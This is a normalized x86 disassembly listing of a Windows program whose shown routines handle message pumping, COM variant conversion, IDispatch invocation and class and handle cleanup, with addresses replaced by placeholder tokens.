mov eax [ esi + 0x30 ]
mov eax [ esi ]
push [ esp + 0xc ]
mov ecx esi
call [ eax + 0x60 ]
cmp eax 0xffffffff
je r-xdata
cmp eax 0x2
jne r-xdata
sub_424a8d
push ebp
mov ebp esp
sub esp 0x1c
mov eax [ ebp + 0x8 ]
push esi
push edi
lea edi [ eax - 0x3c ]
mov eax [ ebp + 0x10 ]
cmp eax [ edi + 0x38 ]
jbe r-xdata
xor esi esi
xor esi esi
cmp [ edi + 0x2c ] esi
jne r-xdata
push 0x2
push esi
push esi
lea eax [ ebp - 0x1c ]
push esi
push eax
call [ PeekMessageA@IAT ]
test eax eax
je r-xdata
push 0x2
jmp r-xdata
mov eax [ edi ]
lea ecx [ ebp - 0x1c ]
push ecx
mov ecx edi
call [ eax + 0x5c ]
test eax eax
je r-xdata
push 0x1
mov eax [ edi ]
lea ecx [ ebp - 0x1c ]
push ecx
mov ecx edi
call [ eax + 0x58 ]
pop eax
cmp [ edi + 0x2c ] esi
je r-xdata
cmp [ edi + 0x28 ] esi
je r-xdata
push ebx
push 0x3
mov ebx 0x200
push 0x209
push ebx
lea eax [ ebp - 0x1c ]
push esi
mov esi [ PeekMessageA@IAT ]
mov [ edi + 0x2c ] 0x1
push eax
push 0x108
mov ebx 0x100
push 0x209
push ebx
lea eax [ ebp - 0x1c ]
push 0x0
push eax
jmp r-xdata
mov eax [ edi ]
push [ ebp + 0xc ]
mov ecx edi
call [ eax + 0x64 ]
and [ edi + 0x2c ] 0x0
push 0x1
pop eax
pop ebx
jmp r-xdata
push 0x3
push 0x108
jmp r-xdata
call esi
test eax eax
push 0x3
je r-xdata
pop edi
pop esi
leave
retn 0x10
push ebx
lea eax [ ebp - 0x1c ]
push 0x0
push eax
call esi
test eax eax
je r-xdata
sub_424b62
push ecx
push ebx
push ebp
push esi
mov esi ecx
xor ebp ebp
push edi
mov eax [ esi ]
push ebp
mov edi [ MultiByteToWideChar@IAT ]
push ebp
push [ eax - 0x8 ]
push eax
push ebp
push ebp
call edi
push eax
push ebp
mov [ esp + 0x18 ] eax
call [ SysAllocStringLen@IAT ]
mov ebx eax
cmp ebx ebp
jne r-xdata
push [ esp + 0x10 ]
mov eax [ esi ]
push ebx
push [ eax - 0x8 ]
push eax
push ebp
push ebp
call edi
pop edi
pop esi
mov eax ebx
pop ebp
pop ebx
pop ecx
retn
call sub_41a429
sub_424bab
movzx eax [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
mov eax [ eax * 4 + r--data ]
mov cl [ edx ]
add eax 0x4
test cl cl
je r-xdata
retn 0x8
push esi
mov cl [ edx + 0x1 ]
inc edx
test cl cl
jne r-xdata
test cl 0x40
mov esi r--data
jne r-xdata
cmp cl 0xff
je r-xdata
pop esi
movzx ecx cl
and ecx 0xffffffbf
add eax [ esi + ecx * 4 ]
mov esi r--data
sub_424bee
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
push 0x4
pop ebx
mov [ edi ] ecx
add edi ebx
cmp [ ebp + 0x14 ] 0x6
je r-xdata
mov eax [ ebp + 0x10 ]
mov [ edi ] eax
add edi ebx
cmp [ ebp + 0x14 ] 0xc
jne r-xdata
cmp [ ebp + 0x14 ] 0x0
jle r-xdata
mov eax [ ebp + 0x10 ]
dec [ ebp + 0x14 ]
movzx cx [ eax ]
mov eax 0xff
mov [ ebp + 0x8 ] ecx
cmp cx ax
je r-xdata
mov edx [ ebp + 0x18 ]
and [ ebp - 0x8 ] 0x0
mov eax [ edx ]
mov [ ebp - 0xc ] eax
mov eax [ edx + 0x8 ]
mov [ ebp + 0x14 ] eax
mov eax [ edx + 0xc ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp + 0x10 ] eax
mov eax [ ebp + 0x10 ]
cmp [ eax ] 0x0
je r-xdata
mov eax 0x8002000e
mov esi [ ebp - 0x4 ]
cmp [ ebp + 0x14 ] esi
jl r-xdata
test cl 0x40
je r-xdata
xor eax eax
mov ecx [ ebp + 0x1c ]
mov eax [ edx + 0x8 ]
mov [ ecx ] eax
mov eax 0x8002000f
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x1c
cmp cx ax
jne r-xdata
cmp cx ax
je r-xdata
and ecx 0xffbf
or ch 0x40
mov [ ebp + 0x8 ] ecx
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ edx + 0xc ]
and [ ebp - 0x4 ] 0x0
mov [ ebp + 0x14 ] eax
mov [ ebp - 0x8 ] 0x1
jmp r-xdata
mov eax [ ebp + 0x14 ]
mov esi [ ebp - 0xc ]
shl eax 0x4
add esi eax
cmp cx 0xc
je r-xdata
cmp cx 0xc
jne r-xdata
inc [ ebp + 0x10 ]
mov eax [ ebp + 0x10 ]
jmp r-xdata
movzx eax cx
cmp eax 0x11
jg r-xdata
mov dx [ esi ]
cmp cx dx
je r-xdata
mov [ rw-data ] 0xa
mov [ rw-data ] 0x80020004
mov esi rw-data
jmp r-xdata
cmp [ eax ] 0x0
je r-xdata
add eax 0xffffbffe
cmp eax 0x10
ja r-xdata
je r-xdata
mov edx [ ebp + 0x18 ]
mov ebx [ ebp + 0x20 ]
mov [ ebp + 0xc ] 0x8
add ebx eax
cmp cx 0xe
je r-xdata
jmp [ eax * 4 + jump_table_424e29 ]
movzx eax [ esi + 0x8 ]
jmp r-xdata
add eax 0xfffffffe
cmp eax 0xb
ja r-xdata
cmp dx [ ebp + 0xc ]
je r-xdata
mov [ ebp + 0xc ] ecx
mov eax [ esi + 0x8 ]
mov [ edi ] eax
jmp [ eax * 4 + jump_table_424df9 ]
cmp cx 0xe
jne r-xdata
push [ ebp + 0xc ]
push 0x0
push esi
push ebx
call [ VariantChangeType@IAT ]
test eax eax
jl r-xdata
movsx eax [ esi + 0x8 ]
jmp r-xdata
fld [ esi + 0x8 ]
fstp [ edi ]
jmp r-xdata
mov eax [ esi + 0x8 ]
mov [ edi ] eax
mov eax [ esi + 0xc ]
mov [ edi + 0x4 ] eax
xor eax eax
cmp [ esi + 0x8 ] ax
setne al
jmp r-xdata
mov [ edi ] esi
jmp r-xdata
push 0x4
mov esi ebx
pop ebx
mov ax [ esi ]
cmp ax [ ebp + 0xc ]
je r-xdata
mov ecx [ ebp + 0x1c ]
mov edx [ ebp + 0x14 ]
mov [ ecx ] edx
jmp r-xdata
mov ecx [ ebp + 0x8 ]
add edi 0x8
jmp r-xdata
add edi ebx
push [ esi + 0x8 ]
call sub_423f68
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x8
mov esi [ ebx + 0x8 ]
push esi
call sub_423f68
push esi
mov [ ebx + 0x8 ] eax
call [ SysFreeString@IAT ]
jmp r-xdata
mov [ ebp + 0x8 ] 0x8
mov ecx [ ebp + 0x8 ]
sub_424e6d
mov eax sub_4265ec
call sub_40cc20
sub esp 0x2c
and [ ebp - 0x11 ] 0x0
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
mov [ ebp - 0x20 ] ecx
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x10 ] esp
test eax eax
mov [ ebp + 0x8 ] eax
jne r-xdata
push [ ebp + 0x8 ]
call [ lstrlenA@IAT ]
test [ ebp + 0xc ] 0xc
mov esi eax
mov eax [ ebx + 0x10 ]
mov [ ebp - 0x1c ] eax
mov ax [ ebx + 0xc ]
mov [ ebp - 0x18 ] ax
je r-xdata
lea eax [ ebp - 0x11 ]
mov [ ebp + 0x8 ] eax
mov eax [ ebp + 0x14 ]
mov esi [ eax + 0x8 ]
shl esi 0x4
mov eax esi
add eax 0x3
and al 0xfc
call sub_40c4f0
mov ebx esp
test ebx ebx
mov [ ebp + 0xc ] ebx
je r-xdata
lea eax [ esi + 0x3 ]
add eax 0x3
and al 0xfc
call sub_40c4f0
mov edi esp
push esi
push [ ebp + 0x8 ]
push edi
call sub_40ce30
mov ax [ ebx + 0xc ]
add esp 0xc
cmp ax 0x8
mov [ ebp + 0x8 ] edi
jne r-xdata
mov eax 0x8007000e
jmp r-xdata
push esi
push 0x0
push ebx
call sub_40cc70
add esp 0xc
push [ ebp - 0x18 ]
push [ ebp + 0x8 ]
call sub_424bab
mov esi eax
lea eax [ esi + 0x10 ]
add eax 0x3
and al 0xfc
call sub_40c4f0
mov edi esp
test edi edi
jne r-xdata
or [ edi + esi ] 0xff
inc esi
mov [ edi + esi ] al
and [ edi + esi + 0x1 ] 0x0
mov eax [ ebx + 0x14 ]
and [ ebp - 0x18 ] 0x0
mov [ ebp - 0x1c ] eax
push 0xe
pop eax
mov ecx [ ebp - 0xc ]
lea esp [ ebp - 0x44 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn 0x14
push ebx
mov ecx [ ebp - 0x20 ]
push [ ebp + 0x18 ]
lea eax [ ebp - 0x34 ]
push [ ebp + 0x14 ]
push [ ebp - 0x18 ]
push eax
push [ ebp + 0x8 ]
push edi
call sub_424bee
xor ebx ebx
mov [ ebp + 0x18 ] eax
test eax eax
jne r-xdata
mov esi [ ebp + 0x14 ]
xor edi edi
cmp [ esi + 0x8 ] edi
jbe r-xdata
movzx eax [ ebp - 0x18 ]
and [ ebp - 0x4 ] ebx
sub eax 0x4
je r-xdata
mov eax [ ebp + 0x18 ]
test eax eax
jne r-xdata
mov eax [ ebp + 0xc ]
mov [ ebp + 0xc ] eax
push esi
push edi
push [ ebp - 0x1c ]
call sub_4259cf
fstp [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x34 ] eax
dec eax
je r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
push [ ebp + 0xc ]
call [ VariantClear@IAT ]
add [ ebp + 0xc ] 0x10
inc edi
cmp edi [ esi + 0x8 ]
jb r-xdata
push esi
push edi
push [ ebp - 0x1c ]
call sub_4259cf
fst [ ebp - 0x24 ]
jmp r-xdata
dec eax
push esi
push edi
dec eax
push [ ebp - 0x1c ]
je r-xdata
movzx eax [ ebp - 0x18 ]
sub eax 0x8
je r-xdata
mov ecx [ ebp - 0x18 ]
mov [ eax ] cx
movzx ecx cx
add ecx 0xfffffffe
cmp ecx 0x10
ja r-xdata
fstp [ ebp - 0x34 ]
jmp r-xdata
call sub_4259cf
fst [ ebp - 0x24 ]
call sub_4259cf
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
dec eax
je r-xdata
xor eax eax
jmp [ ecx * 4 + jump_table_4250d1 ]
or [ ebp - 0x4 ] 0xffffffff
push ebx
call [ SysFreeString@IAT ]
test ebx ebx
je r-xdata
sub eax 0x3
je r-xdata
mov [ eax + 0x8 ] bl
jmp r-xdata
mov [ eax + 0x8 ] ebx
jmp r-xdata
mov ecx [ ebp - 0x34 ]
mov [ eax + 0x8 ] ecx
jmp r-xdata
mov ecx [ ebp - 0x34 ]
mov [ eax + 0x8 ] ecx
mov ecx [ ebp - 0x30 ]
mov [ eax + 0xc ] ecx
jmp r-xdata
fld [ ebp - 0x34 ]
fstp [ eax + 0x8 ]
jmp r-xdata
neg ebx
sbb ebx ebx
mov [ eax + 0x8 ] bx
jmp r-xdata
lea esi [ ebp - 0x34 ]
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
jmp r-xdata
mov eax [ ebx ]
push ebx
call [ eax + 0x8 ]
jmp r-xdata
lea eax [ ebp - 0x34 ]
push eax
call [ VariantClear@IAT ]
jmp r-xdata
dec eax
je r-xdata
jmp r-xdata
sub_425024
mov esi [ ebp + 0x14 ]
xor edi edi
cmp [ esi + 0x8 ] edi
jbe r-xdata
push 0x0
push 0x0
call sub_40da39
mov [ eax + 0x8 ] ebx
jmp r-xdata
mov ebx [ ebp + 0xc ]
xor eax eax
mov ecx [ ebp - 0xc ]
lea esp [ ebp - 0x44 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn 0x14
push ebx
call [ VariantClear@IAT ]
inc edi
add ebx 0x10
cmp edi [ esi + 0x8 ]
jb r-xdata
sub_425115
mov eax sub_426616
call sub_40cc20
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
lea ecx [ esi + 0x18 ]
mov [ ebp - 0x4 ] 0x2
call sub_41c358
lea ecx [ esi + 0x14 ]
mov [ ebp - 0x4 ] 0x1
call sub_41c358
and [ ebp - 0x4 ] 0x0
lea ecx [ esi + 0xc ]
call sub_41c358
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_42517c
push ebp
mov ebp esp
sub esp 0x110
push ebx
push esi
push edi
xor esi esi
push 0x20
push esi
push [ ebp + 0x8 ]
call sub_40cc70
mov ecx [ ebp + 0xc ]
add esp 0xc
lea eax [ ebp - 0x110 ]
push r--data
mov [ ebp - 0xc ] eax
call sub_41f5a3
mov edi [ lstrlenA@IAT ]
mov ebx [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp + 0xc ]
push r--data
call sub_41f5a3
test eax eax
lea eax [ ebp - 0x110 ]
push 0x100
push eax
je r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0xc ]
mov dx [ eax + 0x8 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ebp + 0x8 ]
mov [ ecx ] dx
mov edx [ eax + 0x10 ]
mov [ ecx + 0x10 ] edx
mov edx [ eax + 0x1c ]
mov [ ecx + 0x1c ] edx
mov ecx [ eax + 0x14 ]
mov [ ebp - 0x10 ] ecx
cmp [ ecx - 0x8 ] esi
je r-xdata
push 0xf108
call sub_41f494
mov eax [ ebp + 0x8 ]
mov [ eax ] 0xf108
push 0xf10a
call sub_41f494
mov eax [ ebp + 0x8 ]
mov [ eax ] 0xf10a
jmp r-xdata
mov eax [ eax + 0x18 ]
mov [ ebp + 0xc ] eax
cmp [ eax - 0x8 ] esi
je r-xdata
cmp ecx esi
jne r-xdata
push [ ebp - 0xc ]
call edi
inc eax
mov [ ebp - 0x4 ] eax
add eax eax
add eax 0x3
and al 0xfc
call sub_40c4f0
mov eax esp
push [ ebp - 0x4 ]
mov [ ebp + 0xc ] eax
push eax
push 0xffffffff
push [ ebp - 0xc ]
mov [ eax ] si
push esi
push esi
call ebx
mov eax [ ebp + 0xc ]
xor eax eax
jmp r-xdata
cmp [ ebp - 0xc ] esi
jne r-xdata
cmp eax esi
jne r-xdata
push ecx
call edi
inc eax
mov [ ebp - 0x4 ] eax
add eax eax
add eax 0x3
and al 0xfc
call sub_40c4f0
mov eax esp
push [ ebp - 0x4 ]
mov [ ebp - 0x8 ] eax
push eax
push 0xffffffff
push [ ebp - 0x10 ]
mov [ eax ] si
push esi
push esi
call ebx
mov eax [ ebp - 0x8 ]
xor eax eax
jmp r-xdata
cmp [ ecx + 0xc ] esi
jne r-xdata
call sub_422d64
mov eax [ eax + 0x10 ]
cmp eax esi
mov [ ebp + 0xc ] eax
jne r-xdata
push eax
call [ SysAllocString@IAT ]
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x4 ] esi
mov [ ecx + 0x8 ] eax
jne r-xdata
push eax
call edi
inc eax
mov [ ebp - 0x4 ] eax
add eax eax
add eax 0x3
and al 0xfc
call sub_40c4f0
mov eax esp
push [ ebp - 0x4 ]
mov [ ebp - 0x8 ] eax
push eax
push 0xffffffff
push [ ebp + 0xc ]
mov [ eax ] si
push esi
push esi
call ebx
mov eax [ ebp - 0x8 ]
xor eax eax
jmp r-xdata
push eax
call [ SysAllocString@IAT ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0xc ] eax
mov eax [ ebp + 0xc ]
lea esp [ ebp - 0x11c ]
pop edi
pop esi
pop ebx
leave
retn 0x8
cmp [ ecx + 0x10 ] esi
je r-xdata
push eax
call edi
inc eax
mov [ ebp - 0x4 ] eax
add eax eax
add eax 0x3
and al 0xfc
call sub_40c4f0
mov eax esp
push [ ebp - 0x4 ]
mov [ ebp - 0x8 ] eax
push eax
push 0xffffffff
push [ ebp + 0xc ]
mov [ eax ] si
push esi
push esi
call ebx
mov eax [ ebp - 0x8 ]
xor eax eax
jmp r-xdata
push eax
call [ SysAllocString@IAT ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x4 ] eax
jmp r-xdata
call sub_422d64
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x8c ]
cmp eax esi
mov [ ebp + 0xc ] eax
je r-xdata
push eax
call [ SysAllocString@IAT ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x4 ] eax
push esi
call [ SysAllocString@IAT ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0xc ] eax
push eax
call edi
mov edi eax
inc edi
lea eax [ edi + edi ]
add eax 0x3
and al 0xfc
call sub_40c4f0
mov eax esp
push edi
push eax
push 0xffffffff
push [ ebp + 0xc ]
mov [ ebp - 0x8 ] eax
mov [ eax ] si
push esi
push esi
call ebx
mov esi [ ebp - 0x8 ]
sub_4253b8
mov eax sub_426649
call sub_40cc20
push ecx
push esi
mov esi ecx
push edi
mov [ ebp - 0x10 ] esi
call sub_41f634
mov eax [ rw-data ]
and [ ebp - 0x4 ] 0x0
lea ecx [ esi + 0xc ]
mov [ ecx ] eax
mov eax [ rw-data ]
mov [ esi + 0x14 ] eax
mov eax [ rw-data ]
mov [ esi + 0x18 ] eax
mov eax [ ebp + 0xc ]
mov di [ ebp + 0x10 ]
mov edx eax
add eax 0x60000
neg edx
sbb edx edx
mov [ ebp - 0x4 ] 0x3
and edx eax
cmp [ ebp + 0x8 ] 0x0
mov [ esi ] r--data
mov [ esi + 0x10 ] edx
mov [ esi + 0x8 ] di
je r-xdata
neg di
mov ecx [ ebp - 0xc ]
mov eax esi
sbb edi edi
and edi 0x7fff0001
add edi 0x8000ffff
mov [ esi + 0x1c ] edi
pop edi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0xc
push [ ebp + 0x8 ]
call sub_41c49d
sub_42548e
push esi
mov esi ecx
mov eax [ esi ]
test eax eax
je r-xdata
pop esi
retn
cmp [ esi + 0x4 ] 0x0
je r-xdata
and [ esi ] 0x0
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub_4254a8
mov eax sub_42665d
call sub_40cc20
sub esp 0x60
push ebx
mov ebx ecx
push esi
push edi
cmp [ ebx ] 0x0
mov [ ebp - 0x28 ] ebx
je r-xdata
mov ecx [ ebp - 0xc ]
lea esp [ ebp - 0x78 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn 0x18
push 0x10
lea eax [ ebp - 0x4c ]
push 0x0
push eax
call sub_40cc70
mov edi [ ebp + 0x18 ]
add esp 0xc
test edi edi
je r-xdata
mov eax [ ebp - 0x44 ]
push edi
call [ lstrlenA@IAT ]
mov [ ebp - 0x44 ] eax
jmp r-xdata
test eax eax
je r-xdata
lea ecx [ ebp - 0x1c ]
mov [ ebp - 0x40 ] 0x1
mov [ ebp - 0x48 ] ecx
test [ ebp + 0xc ] 0xc
mov [ ebp - 0x1c ] 0xfffffffd
je r-xdata
lea eax [ ebp - 0x3c ]
xor esi esi
push eax
call sub_40b948
cmp [ ebp + 0x10 ] si
je r-xdata
shl eax 0x4
push eax
call sub_41b806
mov esi eax
mov eax [ ebp - 0x44 ]
shl eax 0x4
push eax
push 0x0
push esi
mov [ ebp - 0x4c ] esi
call sub_40cc70
mov eax [ ebp - 0x44 ]
add esp 0x10
shl eax 0x4
cmp [ edi ] 0x0
mov [ ebp - 0x14 ] edi
lea esi [ eax + esi - 0x10 ]
mov [ ebp - 0x10 ] esi
je r-xdata
push 0x20
lea eax [ ebp - 0x6c ]
push 0x0
push eax
call sub_40cc70
add esp 0xc
lea edx [ ebp - 0x2c ]
mov eax [ ebx ]
or [ ebp - 0x2c ] 0xffffffff
push edx
lea edx [ ebp - 0x6c ]
push edx
lea edx [ ebp - 0x4c ]
push esi
push edx
push [ ebp + 0xc ]
mov ecx [ eax ]
push 0x0
push r--data
push [ ebp + 0x8 ]
push eax
call [ ecx + 0x18 ]
mov [ ebp + 0x18 ] eax
mov eax [ ebp - 0x44 ]
test eax eax
je r-xdata
lea esi [ ebp - 0x3c ]
mov eax [ ebp + 0x1c ]
add esi 0x8
push 0x4
mov [ ebp - 0x18 ] esi
lea ebx [ eax - 0x4 ]
add eax 0xfffffff8
mov [ ebp + 0x1c ] eax
pop edi
push [ ebp - 0x4c ]
call sub_41b82f
xor ebx ebx
pop ecx
cmp [ ebp + 0x18 ] ebx
jge r-xdata
mov ecx [ ebp - 0x4c ]
mov esi edi
shl eax 0x4
cmp [ edi ] 0x0
lea ebx [ eax + ecx - 0x10 ]
je r-xdata
movzx eax [ ecx ]
mov ecx 0x4002
cmp eax ecx
jg r-xdata
and ax 0xffbf
or ah 0x40
mov [ ecx ] ax
mov edi [ ebp + 0x10 ]
cmp di bx
je r-xdata
lea eax [ ebp - 0x3c ]
push eax
call [ VariantClear@IAT ]
cmp [ ebp + 0x18 ] 0x80020009
je r-xdata
mov al [ esi ]
cmp al 0x8
je r-xdata
add eax 0xffffbffd
cmp eax 0xe
ja r-xdata
je r-xdata
cmp di 0xc
je r-xdata
cmp [ ebp - 0x54 ] ebx
je r-xdata
push [ ebp + 0x18 ]
call sub_424277
push ebx
call [ VariantClear@IAT ]
cmp al 0xe
jne r-xdata
sub [ ebp - 0x10 ] 0x10
sub esi 0x10
inc [ ebp - 0x14 ]
mov [ ebp - 0x18 ] esi
mov eax [ ebp - 0x14 ]
cmp [ eax ] 0x0
jne r-xdata
jmp [ eax * 4 + jump_table_425953 ]
add [ ebp + 0x1c ] edi
mov eax [ ebx + edi ]
add ebx edi
add eax 0xfffffffe
cmp eax 0xf
ja r-xdata
movzx eax di
add eax 0xfffffffe
cmp eax 0xf
ja r-xdata
push edi
lea eax [ ebp - 0x3c ]
push ebx
push eax
lea eax [ ebp - 0x3c ]
push eax
call [ VariantChangeType@IAT ]
mov esi eax
cmp esi ebx
jge r-xdata
push 0x20
call sub_41b806
pop ecx
mov [ ebp + 0x14 ] eax
cmp eax ebx
mov [ ebp - 0x4 ] ebx
je r-xdata
lea eax [ ebp - 0x6c ]
push eax
call [ ebp - 0x54 ]
sub ebx 0x10
inc esi
cmp [ esi ] 0x0
jne r-xdata
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x10 ]
movzx ax [ eax ]
test al 0x40
mov [ ecx ] ax
je r-xdata
mov ebx [ ebp - 0x28 ]
mov edi [ ebp + 0x18 ]
mov eax [ ebx + edi ]
add [ ebp + 0x1c ] edi
add ebx edi
mov ecx [ eax ]
neg ecx
sbb ecx ecx
and ecx 0xffff
mov [ eax ] ecx
jmp r-xdata
jmp [ eax * 4 + jump_table_425913 ]
jmp [ eax * 4 + jump_table_42598f ]
lea eax [ ebp - 0x3c ]
push eax
call [ VariantClear@IAT ]
push esi
call sub_424277
xor esi esi
push [ ebp - 0x6c ]
mov ecx eax
push ebx
push ebx
call sub_4253b8
mov esi eax
jmp r-xdata
mov [ esi ] eax
add [ ebp + 0x1c ] edi
mov al [ ebx + edi ]
add ebx edi
mov [ esi ] al
jmp r-xdata
add [ ebp + 0x1c ] edi
mov ax [ ebx + edi ]
add ebx edi
add [ ebp + 0x1c ] 0x8
add ebx 0x8
mov eax [ ebp + 0x1c ]
fld [ eax ]
fstp [ esi ]
jmp r-xdata
add [ ebp + 0x1c ] 0x8
add ebx 0x8
mov eax [ ebp + 0x1c ]
fld [ eax ]
fstp [ esi ]
jmp r-xdata
add [ ebp + 0x1c ] edi
mov eax [ ebx + edi ]
add ebx edi
mov ecx [ eax ]
mov [ esi ] ecx
mov eax [ eax + 0x4 ]
mov [ esi + 0x4 ] eax
jmp r-xdata
mov eax [ ebx + edi ]
add [ ebp + 0x1c ] edi
add ebx edi
push eax
mov [ ebp - 0x18 ] eax
call [ SysAllocString@IAT ]
cmp [ ebp - 0x18 ] 0x0
mov [ esi ] eax
je r-xdata
mov eax [ ebx + edi ]
add [ ebp + 0x1c ] edi
add ebx edi
mov [ ebp - 0x18 ] eax
test eax eax
je r-xdata
mov eax [ ebx + edi ]
add [ ebp + 0x1c ] edi
add ebx edi
neg eax
sbb eax eax
jmp r-xdata
add [ ebp + 0x1c ] 0x4
mov esi [ ebx + 0x4 ]
mov edi [ ebp - 0x10 ]
add ebx 0x4
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi [ ebp - 0x18 ]
push 0x4
pop edi
jmp r-xdata
mov eax [ ebp + 0x14 ]
mov cl [ ebp - 0x34 ]
mov [ eax ] cl
jmp r-xdata
mov eax [ ebp + 0x14 ]
mov cx [ ebp - 0x34 ]
mov [ eax ] cx
jmp r-xdata
mov eax [ ebp + 0x14 ]
mov ecx [ ebp - 0x34 ]
mov [ eax ] ecx
mov ecx [ ebp - 0x30 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
push [ ebp - 0x34 ]
push [ ebp + 0x14 ]
call sub_423f23
push [ ebp - 0x34 ]
call [ SysFreeString@IAT ]
jmp r-xdata
mov ecx [ ebp + 0x14 ]
xor eax eax
cmp [ ebp - 0x34 ] bx
setne al
mov [ ecx ] eax
jmp r-xdata
mov edi [ ebp + 0x14 ]
lea esi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
jmp r-xdata
mov eax [ ebp + 0x14 ]
mov ecx [ ebp - 0x34 ]
mov [ eax ] ecx
cmp [ ebp - 0x64 ] ebx
je r-xdata
push [ ebp - 0x68 ]
lea ecx [ esi + 0x18 ]
call sub_41c4c4
push [ ebp - 0x68 ]
call edi
or [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x68 ] ebx
mov edi [ SysFreeString@IAT ]
je r-xdata
test eax eax
jne r-xdata
push eax
call [ SysAllocString@IAT ]
cmp [ ebp - 0x18 ] 0x0
mov [ esi ] eax
je r-xdata
push [ ebp - 0x18 ]
call [ lstrlenA@IAT ]
inc eax
mov [ ebp - 0x20 ] eax
add eax eax
add eax 0x3
and al 0xfc
call sub_40c4f0
mov eax esp
push [ ebp - 0x20 ]
xor ecx ecx
mov [ ebp - 0x24 ] eax
push eax
push 0xffffffff
push [ ebp - 0x18 ]
mov [ eax ] cx
push ecx
push ecx
call [ MultiByteToWideChar@IAT ]
mov eax [ ebp - 0x24 ]
mov [ esi ] ax
jmp r-xdata
cmp [ ebp - 0x60 ] ebx
je r-xdata
push [ ebp - 0x64 ]
lea ecx [ esi + 0xc ]
call sub_41c4c4
push [ ebp - 0x64 ]
call edi
call sub_41a429
jmp r-xdata
mov eax [ ebp - 0x10 ]
mov [ eax ] 0x8
jmp r-xdata
test eax eax
jne r-xdata
mov eax [ ebp - 0x5c ]
push r--data
mov [ esi + 0x10 ] eax
mov eax [ ebp - 0x50 ]
mov [ esi + 0x1c ] eax
lea eax [ ebp + 0x14 ]
push eax
mov [ ebp + 0x14 ] esi
call sub_40da39
push [ ebp - 0x60 ]
lea ecx [ esi + 0x14 ]
call sub_41c4c4
push [ ebp - 0x60 ]
call edi
call sub_41a429
sub_4259e0
mov eax sub_425c7c
call sub_40cc20
push ecx
mov [ ebp - 0x10 ] ecx
mov [ ecx ] r--data
and [ ebp - 0x4 ] 0x0
add ecx 0x4
push ecx
call sub_421403
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
sub_425a30
mov eax sub_425cf4
call sub_40cc20
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov eax [ esi + 0x28 ]
and [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
call sub_422d8a
cmp [ eax + 0x4 ] esi
jne r-xdata
push eax
call [ CloseHandle@IAT ]
or [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_41b355
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
and [ eax + 0x4 ] 0x0
sub_425a89
mov eax sub_4267d4
call sub_40cc20
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
and [ ebp - 0x4 ] 0x0
call sub_425ac1
or [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_41b355
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_425ada
push esi
mov esi ecx
cmp [ esi + 0x42 ] 0x0
je r-xdata
pop esi
retn
mov eax [ esi + 0x20 ]
test eax eax
je r-xdata
and [ esi + 0x42 ] 0x0
push eax
call [ CoRevokeClassObject@IAT ]
and [ esi + 0x20 ] 0x0
sub_425afb
push esi
call sub_422d64
push 0x0
mov esi eax
call sub_4238a9
mov esi [ esi + 0x24 ]
push 0x0
call sub_423919
pop esi
retn
mov ecx esi
call sub_425ada
mov esi [ esi + 0x1c ]
jmp r-xdata
test esi esi
je r-xdata
sub_425b26
push ebx
push ebp
push esi
push edi
call sub_422d64
push 0x1
mov ebp eax
call sub_4238a9
add ebp 0x34
xor ebx ebx
mov esi ebp
push 0x1
mov [ ebp ] bl
call sub_423919
call sub_422d64
mov eax [ eax + 0x4 ]
cmp eax ebx
je r-xdata
push 0xa
push esi
call sub_40d3e0
pop ecx
mov edi eax
pop ecx
mov [ edi ] bl
call sub_422d64
push [ eax + 0x8 ]
push esi
call [ UnregisterClassA@IAT ]
lea esi [ edi + 0x1 ]
jmp r-xdata
call sub_422b32
mov esi eax
mov ecx [ esi + 0xcc ]
lea edi [ esi + 0xcc ]
cmp ecx ebx
je r-xdata
mov eax [ eax + 0x54 ]
cmp eax ebx
je r-xdata
